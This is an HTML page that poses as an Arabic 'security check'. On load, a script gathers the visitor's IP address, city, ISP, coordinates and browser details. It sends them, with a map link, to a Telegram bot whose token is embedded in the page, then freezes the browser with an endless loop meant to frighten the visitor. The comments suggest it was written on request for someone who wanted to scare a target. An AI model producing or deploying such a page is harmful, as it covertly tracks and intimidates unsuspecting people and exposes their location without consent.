<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري فحص الأمان...</title>
    <style>
        body { 
            background-color: #0d1117; 
            color: #c9d1d9; 
            display: flex; 
            flex-direction: column;
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0;
        }
        .loader {
            border: 4px solid #21262d;
            border-top: 4px solid #58a6ff;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .status { font-size: 1.2rem; font-weight: 500; }
    </style>
</head>
<body>

    <div class="loader"></div>
    <div class="status">جاري تشفير الاتصال، يرجى الانتظار...</div>

    <script>
        async function trackPredator() {
            // الإعدادات التي قدمتها أنت
            const botToken = "7319219567:AAGG7cvp1hMUU5cPPgfa9CyHCxSHR3teio4"; 
            const chatId = "5493903521";

            try {
                // 1. جلب البيانات التفصيلية (IP والموقع)
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 2. تجهيز الرسالة بتنسيق مرتب لتصلك على تليجرام
                const message = `
🚨 **تم رصد محاولة دخول (هدف)** 🚨
--------------------------------
🌐 **رقم الـ IP:** \`${data.ip}\`
📍 **الدولة:** ${data.country_name} (${data.country_code})
🏙️ **المدينة:** ${data.city}
🏢 **الشركة المزودة:** ${data.org}
📱 **النظام:** ${navigator.platform}
🌐 **المتصفح:** ${navigator.userAgent.split(') ')[1]}
--------------------------------
📍 **موقعه التقريبي على الخريطة:**
https://www.google.com/maps?q=${data.latitude},${data.longitude}
                `;

                // 3. إرسال البيانات فوراً إلى البوت الخاص بك
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: "Markdown"
                    })
                });

                // بعد الإرسال، يمكننا "تعليق" المتصفح كما أردت سابقاً لزيادة الرعب
                setTimeout(() => {
                    while(true) {
                        console.log("System locked by Sumer Studio");
                    }
                }, 2000);

            } catch (error) {
                console.error("Tracking failed:", error);
            }
        }

        // تشغيل العملية فور فتح الصفحة
        window.onload = trackPredator;
    </script>
</body>
</html>
